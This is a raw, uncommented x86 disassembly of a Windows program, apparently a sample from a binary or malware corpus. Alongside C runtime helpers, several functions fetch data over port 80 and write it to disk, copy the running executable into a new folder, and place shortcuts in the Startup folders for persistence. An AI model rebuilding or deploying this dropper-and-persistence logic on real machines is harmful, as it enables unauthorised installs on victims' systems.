call sub_405690
pop ecx
test eax eax
pop ecx
jne r-xdata
and [ esi ] 0x0
mov eax [ ebp - 0x4 ]
add eax edi
cmp esi eax
jae r-xdata
mov [ ebp - 0x8 ] 0x1
sub_404ac9
push ebp
mov ebp esp
sub esp 0x214
push ebx
push esi
push edi
push 0x3e800
call sub_4054cb
mov edi eax
xor esi esi
cmp edi esi
pop ecx
mov [ ebp - 0x4 ] edi
je r-xdata
xor eax eax
lea eax [ ebp - 0x8 ]
push esi
push eax
push edi
push esi
push rw-data
push [ ebp + 0x8 ]
push 0x50
push rw-data
call sub_401eea
add esp 0x20
test eax eax
jne r-xdata
mov edi [ SHGetSpecialFolderPathA@IAT ]
push esi
lea eax [ ebp - 0x214 ]
push 0x2
push eax
push esi
call edi
push [ ebp + 0xc ]
lea eax [ ebp - 0x214 ]
mov ebx rw-data
push rw-data
push eax
lea eax [ ebp - 0x214 ]
push ebx
push eax
call sub_405630
add esp 0x14
lea eax [ ebp - 0x110 ]
push esi
push 0x2
push eax
push esi
call edi
push rw-data
lea eax [ ebp - 0x110 ]
push rw-data
push eax
lea eax [ ebp - 0x110 ]
push ebx
push eax
call sub_405630
add esp 0x14
lea eax [ ebp - 0x110 ]
push esi
push 0x20
push 0x2
push esi
push esi
push 0x40000000
push eax
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push edi
jmp r-xdata
lea eax [ ebp - 0xc ]
push esi
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push edi
call [ WriteFile@IAT ]
push edi
mov ebx eax
call [ CloseHandle@IAT ]
push [ ebp - 0x4 ]
call sub_405f9f
cmp ebx esi
pop ecx
je r-xdata
push [ ebp - 0x4 ]
call sub_405f9f
pop ecx
lea eax [ ebp - 0x110 ]
push eax
call sub_40432b
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x214 ]
push esi
push eax
lea eax [ ebp - 0x110 ]
push eax
call [ CopyFileA@IAT ]
lea eax [ ebp - 0x214 ]
push eax
lea eax [ ebp - 0x110 ]
push eax
call sub_40439f
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x214 ]
push eax
call sub_403bcb
pop ecx
push 0x1
pop eax
jmp r-xdata
lea eax [ ebp - 0x110 ]
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0x214 ]
push eax
call sub_4049cc
test eax eax
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_404c48
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x3e800
xor edi edi
call sub_4054cb
mov esi eax
pop ecx
test esi esi
je r-xdata
pop edi
pop esi
leave
retn
lea eax [ ebp - 0x4 ]
push 0x0
push eax
push esi
push 0x0
push rw-data
push [ ebp + 0x8 ]
push 0x50
push rw-data
call sub_401eea
add esp 0x20
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
push rw-data
push esi
and [ eax + esi ] 0x0
call sub_405690
pop ecx
test eax eax
pop ecx
je r-xdata
xor edi edi
jmp r-xdata
push esi
call sub_405f9f
pop ecx
mov eax edi
push 0x1
pop edi
sub_404cb1
push esi
push edi
xor edi edi
push edi
push 0x80
push 0x3
push edi
push 0x3
push 0x80000000
push [ esp + 0x24 ]
call [ CreateFileA@IAT ]
mov esi eax
or eax 0xffffffff
cmp esi eax
je r-xdata
pop edi
pop esi
retn
push edi
push esi
call [ GetFileSize@IAT ]
push esi
mov edi eax
call [ CloseHandle@IAT ]
mov eax edi
sub_404cee
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
call sub_405f9f
pop ecx
call [ Ordinal_WSOCK32_116@IAT ]
push 0x1
call sub_406369
push 0x0
call sub_405f9f
pop ecx
sub_404d1d
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push rw-data
push rw-data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
lea eax [ ebp - 0x4 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
leave
retn
sub_404d61
push ebp
mov ebp esp
sub esp 0x104
push esi
mov esi [ SHGetSpecialFolderPathA@IAT ]
push 0x0
lea eax [ ebp - 0x104 ]
push 0x7
push eax
push 0x0
call esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x104 ]
push rw-data
push eax
call sub_405550
push [ ebp + 0x8 ]
lea eax [ ebp - 0x104 ]
push eax
call sub_405550
add esp 0x10
lea eax [ ebp - 0x104 ]
push eax
call [ DeleteFileA@IAT ]
push eax
lea eax [ ebp - 0x104 ]
push 0x18
push eax
push 0x0
call esi
test eax eax
je r-xdata
pop esi
leave
retn
sub_404dc9
push ebp
mov ebp esp
sub esp 0x310
push esi
xor esi esi
push edi
mov edi [ SHGetSpecialFolderPathA@IAT ]
push esi
lea eax [ ebp - 0x108 ]
push 0x7
push eax
push esi
call edi
test eax eax
jne r-xdata
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call sub_405550
push [ ebp + 0x8 ]
lea eax [ ebp - 0x108 ]
push eax
call sub_405550
lea eax [ ebp - 0x108 ]
push esi
push eax
call sub_40bf36
add esp 0x18
test eax eax
jne r-xdata
push esi
lea eax [ ebp - 0x108 ]
push 0x18
push eax
push esi
call edi
test eax eax
je r-xdata
push esi
call [ CoInitialize@IAT ]
lea eax [ ebp - 0x4 ]
push eax
push r--data
push 0x1
push esi
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
jl r-xdata
cmp [ ebp + 0x14 ] esi
je r-xdata
pop edi
pop esi
leave
retn
mov eax [ ebp - 0x4 ]
push [ ebp + 0x10 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
push [ ebp + 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
lea edx [ ebp + 0x8 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebp - 0x310 ]
push 0x104
push eax
lea eax [ ebp - 0x108 ]
push 0xffffffff
push eax
push esi
push esi
call [ MultiByteToWideChar@IAT ]
mov eax [ ebp + 0x8 ]
lea edx [ ebp - 0x310 ]
push 0x1
push edx
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_404ed3
push ebp
mov ebp esp
sub esp 0x410
push ebx
push esi
push edi
mov esi rw-data
mov edi rw-data
push esi
push edi
call sub_405690
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x30c ]
push 0x104
xor ebx ebx
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
mov edi [ SHGetSpecialFolderPathA@IAT ]
push ebx
lea eax [ ebp - 0x208 ]
push 0x2
push eax
push ebx
call edi
test eax eax
jne r-xdata
push edi
call sub_404d61
pop ecx
lea eax [ ebp - 0x208 ]
push eax
lea eax [ ebp - 0x104 ]
push eax
call sub_405540
push [ ebp + 0xc ]
lea eax [ ebp - 0x104 ]
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x208 ]
push rw-data
push eax
call sub_405630
add esp 0x1c
lea eax [ ebp - 0x30c ]
push eax
lea eax [ ebp - 0x208 ]
push eax
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x208 ]
push 0x17
push eax
push ebx
call edi
test eax eax
je r-xdata
lea eax [ ebp - 0x208 ]
push 0x1
push eax
push rw-data
push esi
call sub_404dc9
push [ ebp + 0x8 ]
lea eax [ ebp - 0x410 ]
push eax
call sub_405540
add esp 0x18
lea ebx [ ebp - 0x410 ]
mov esi rw-data
lea eax [ ebp - 0x208 ]
push ebx
push eax
push rw-data
push esi
call sub_404dc9
add esp 0x10
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x104 ]
push esi
push eax
call sub_405550
lea eax [ ebp - 0x104 ]
push ebx
push eax
call sub_405550
add esp 0x10
lea eax [ ebp - 0x104 ]
push 0x0
push eax
call [ CreateDirectoryA@IAT ]
test edi edi
je r-xdata
and [ edi ] 0x0
lea eax [ ebp - 0x104 ]
push esi
push eax
call sub_405550
push [ ebp + 0xc ]
lea eax [ ebp - 0x104 ]
push eax
call sub_405550
add esp 0x10
lea eax [ ebp - 0x104 ]
push 0x0
push eax
lea eax [ ebp - 0x30c ]
push eax
call [ CopyFileA@IAT ]
lea ebx [ edi + 0x1 ]
jmp r-xdata
push 0x5c
push ebx
call sub_405d80
mov edi eax
pop ecx
test edi edi
pop ecx
je r-xdata
sub_405058
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx - 0x4 ]
mov ebp [ ebp - 0x4 ]
jmp eax
sub_40509a
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov eax [ fs : 0x0 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and al 0xfd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_4050e9
push ebp
mov ebp esp
sub esp 0x4
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40657d
add esp 0x20
mov [ ebp + 0x14 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp + 0x14 ]
mov esp ebp
pop ebp
retn
sub_40511f
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] sub_405173
inc eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_406d80
mov ecx eax
mov eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_405173
push ebp
mov ebp esp
cld
mov eax [ ebp + 0xc ]
push 0x0
push eax
push [ eax + 0x10 ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_40657d
add esp 0x20
pop ebp
retn
sub_405198
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
push edi
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_40524c
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x14 ] eax
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] r-xdata
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x34 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ rw-data ]
pop ecx
pop ecx
and [ ebp - 0x34 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
mov eax [ ebp - 0x34 ]
pop edi
pop esi
pop ebx
leave
retn
sub_40524c
push ebp
mov ebp esp
push ebx
push esi
push edi
cld
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
test eax eax
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_40657d
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
push 0x1
pop eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp [ ebx + 0x18 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_40509a
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4052c1
push ebp
mov ebp esp
push ecx
push ebx
push esi
cmp [ ebp + 0xc ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0xc ]
mov ebx [ edi + 0x10 ]
mov eax esi
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] eax
jl r-xdata
mov ecx [ ebp + 0x14 ]
inc esi
mov [ ecx ] esi
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
cmp eax [ edi + 0xc ]
ja r-xdata
cmp esi 0xffffffff
jne r-xdata
call sub_406e22
cmp esi eax
jbe r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
lea eax [ esi + esi * 4 ]
cmp [ ebx + eax * 4 + 0x4 ] ecx
lea eax [ ebx + eax * 4 ]
jge r-xdata
call sub_406e22
lea eax [ esi + esi * 4 ]
pop edi
pop esi
lea eax [ ebx + eax * 4 ]
pop ebx
leave
retn
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov eax [ ebp + 0x8 ]
dec [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov eax [ ebp - 0x4 ]
sub_40533c
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40537e
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push eax
push 0xfffffffe
push sub_40535c
push [ fs : 0x0 ]
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
cmp esi [ esp + 0x24 ]
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0x8 ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_405412
call [ ebx + esi * 4 + 0x8 ]
mov eax [ esp + 0x20 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_405450
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_4054dd
cmp [ esp + 0x4 ] 0xffffffe0
ja r-xdata
xor eax eax
push [ esp + 0x4 ]
call sub_405509
test eax eax
pop ecx
jne r-xdata
retn
cmp [ esp + 0x8 ] eax
je r-xdata
push [ esp + 0x4 ]
call sub_406e78
test eax eax
pop ecx
jne r-xdata
sub_405509
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
test esi esi
jne r-xdata
push esi
call sub_407263
test eax eax
pop ecx
jne r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
push 0x1
pop esi
pop esi
retn
sub_405540
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_405550
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_405630
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] 0x42
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
mov [ ebp - 0x1c ] 0x7fffffff
push eax
call sub_407b23
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_407a0e
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_405690
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
inc edx
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
inc eax
retn
or al al
je r-xdata
or al al
je r-xdata
inc ecx
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_405720
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_405780 ]
jmp [ ecx * 4 + jump_table_4057fc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405868 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_405868 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_405a00 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_405908 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_405a00 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405868 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405868 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405868 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_405a00 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_405a00 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_405a00 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_405a00 ]
sub_405a60
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
mov [ edi ] al
inc edi
dec edx
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
inc edi
dec ecx
jne r-xdata
sub_405ab8
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
mov eax [ esi + 0xc ]
test al 0x40
je r-xdata
test al 0x83
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax edi
push esi
call sub_408446
push esi
mov edi eax
call sub_4083e0
push [ esi + 0x10 ]
call sub_40832d
add esp 0xc
test eax eax
jge r-xdata
and [ esi + 0xc ] 0x0
pop edi
pop esi
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_405f9f
and [ esi + 0x1c ] 0x0
pop ecx
sub_405b0e
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi ebx
jg r-xdata
dec [ ebp + 0xc ]
push esi
je r-xdata
xor eax eax
jmp r-xdata
and [ edi ] 0x0
mov esi [ ebp + 0x10 ]
pop edi
pop ebx
pop ebp
retn
push esi
call sub_408518
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
cmp edi [ ebp + 0x8 ]
jne r-xdata
mov [ edi ] al
inc edi
cmp al 0xa
je r-xdata
cmp eax 0xffffffff
je r-xdata
xor ebx ebx
jmp r-xdata
dec [ ebp + 0xc ]
